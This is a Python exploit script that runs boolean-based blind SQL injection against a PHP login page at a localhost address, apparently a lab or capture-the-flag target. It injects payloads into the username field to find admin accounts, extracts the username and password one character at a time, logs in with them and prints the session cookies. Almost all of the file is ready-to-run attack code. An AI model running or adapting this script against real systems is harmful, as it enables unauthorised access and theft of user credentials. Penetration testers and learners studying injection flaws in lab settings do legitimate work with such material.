#!/usr/bin/env python3

import requests
import sys
import time

# Configuration
TARGET_URL = "http://127.0.0.1:33210/index.php"
PHPSESSID = "pr8716h5ra06p5lchf9osb22qr"

# Session setup with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)

def check_boolean_condition(payload):
    """Sends POST request with injected payload and checks boolean condition."""
    data = {
        "username": payload,
        "password": "test",
        "submit": "Login"
    }
    
    try:
        response = session.post(TARGET_URL, data=data, timeout=10)
        
        # TRUE condition: response contains "password"
        # FALSE condition: response contains "username"
        if "password" in response.text:
            return True
        elif "username" in response.text:
            return False
        else:
            # Unexpected response, print for debugging
            print(f"[!] Unexpected response: {response.text[:200]}")
            return False
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return False

def extract_length(column, table="users", where_condition="username='admin'"):
    """Extract the length of a column value using binary search."""
    print(f"[*] Extracting length of {column}...")
    
    low, high = 0, 50  # Reasonable max length for username/password
    length = 0
    
    for mid in range(low, high + 1):
        # Query: Check if length > mid
        payload = f"' OR (SELECT LENGTH({column}) FROM {table} WHERE {where_condition}) > {mid}--"
        
        is_true = check_boolean_condition(payload)
        
        if not is_true:
            length = mid
            print(f"[+] {column} length: {length}")
            return length
    
    print(f"[!] Could not determine length")
    return 0

def extract_character(column, position, table="users", where_condition="username='admin'"):
    """Extract a single character at position using binary search."""
    # Printable ASCII range: 32-126
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        
        # Test if ASCII value > mid
        payload = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition}) > {mid}--"
        
        gt_result = check_boolean_condition(payload)
        
        if gt_result:
            low = mid + 1
        else:
            # Test if ASCII value = mid
            payload_eq = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition}) = {mid}--"
            eq_result = check_boolean_condition(payload_eq)
            
            if eq_result:
                return chr(mid)
            else:
                high = mid - 1
    
    # Fallback: check exact low value
    payload_check = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition}) = {low}--"
    if check_boolean_condition(payload_check):
        return chr(low)
    
    return None

def extract_string(column, table="users", where_condition="username='admin'"):
    """Extract full string column value character by character."""
    print(f"\n[*] Extracting {column}...")
    
    length = extract_length(column, table, where_condition)
    if length == 0:
        return None
    
    result = ""
    for pos in range(1, length + 1):
        char = extract_character(column, pos, table, where_condition)
        if char is None:
            print(f"[!] Failed to extract character at position {pos}")
            break
        
        result += char
        sys.stdout.flush()
        print(f"[+] {column} ({pos}/{length}): {result}")
    
    return result

def test_usernames():
    """Test common usernames to find admin account."""
    common_users = ['admin', 'administrator', 'root']
    
    for user in common_users:
        print(f"\n[*] Testing if '{user}' exists...")
        
        # Check if user exists
        payload = f"' OR (SELECT COUNT(*) FROM users WHERE username='{user}') > 0--"
        if check_boolean_condition(payload):
            print(f"[+] Found user: {user}")
            
            # Extract username length to verify
            username = extract_string('username', 'users', f"username='{user}'")
            if username == user:
                print(f"[+] Confirmed user: {username}")
                return user
    
    # If none found, try to find first user
    print(f"\n[*] No common username found, attempting to find any user...")
    print(f"[*] Extracting first username...")
    username = extract_string('username', 'users', 'id=1')
    print(f"[+] Found username: {username}")
    return username

def attempt_login(extracted_username, extracted_password):
    """Attempt login with extracted credentials."""
    print(f"\n[*] Attempting login with extracted credentials...")
    print(f"[*] Username: {extracted_username}")
    print(f"[*] Password: {extracted_password}")
    
    data = {
        "username": extracted_username,
        "password": extracted_password,
        "submit": "Login"
    }
    
    try:
        response = session.post(TARGET_URL, data=data, timeout=10)
        
        print(f"[+] Login response status: {response.status_code}")
        print(f"[+] Response body:\n{response.text}")
        
        # Check for successful login indicators
        if "password" in response.text.lower():
            print("[!] Login failed - still asking for password")
            return False
        elif "username" in response.text.lower() and "logout" not in response.text.lower():
            print("[!] Login failed - still asking for username")
            return False
        elif "welcome" in response.text.lower() or "dashboard" in response.text.lower() or "logout" in response.text.lower():
            print("[+] Login successful!")
            return True
        else:
            print("[?] Unclear login result - check response manually")
            return None
            
    except Exception as e:
        print(f"[!] Error during login attempt: {e}")
        return False

def main():
    print("=" * 60)
    print("Boolean-Based Blind SQL Injection Exploit")
    print("Target: http://127.0.0.1:33210/index.php")
    print("=" * 60)
    
    # Step 1: Test for common usernames
    admin_username = test_usernames()
    
    if not admin_username:
        print("[!] Could not find admin username")
        return
    
    # Step 2: Extract admin username (in case it's different)
    print(f"\n[*] Extracting full username for '{admin_username}'...")
    extracted_username = extract_string('username', 'users', f"username='{admin_username}'")
    
    # Step 3: Extract admin password
    extracted_password = extract_string('password', 'users', f"username='{admin_username}'")
    
    if not extracted_password:
        print("[!] Could not extract password")
        return
    
    print("\n" + "=" * 60)
    print("EXTRACTED CREDENTIALS:")
    print(f"Username: {extracted_username}")
    print(f"Password: {extracted_password}")
    print("=" * 60)
    
    # Step 4: Attempt login with extracted credentials
    success = attempt_login(extracted_username, extracted_password)
    
    # Print session cookie if available
    if 'PHPSESSID' in session.cookies:
        print(f"\n[+] Session cookie: PHPSESSID={session.cookies['PHPSESSID']}")
    
    for cookie in session.cookies:
        if cookie.name != 'PHPSESSID':
            print(f"[+] Cookie: {cookie.name}={cookie.value}")
    
    if success:
        print("\n[!] SUCCESS: Valid credentials extracted and login successful!")
    else:
        print("\n[!] WARNING: Credentials extracted but login may have failed - verify manually")

if __name__ == "__main__":
    main()

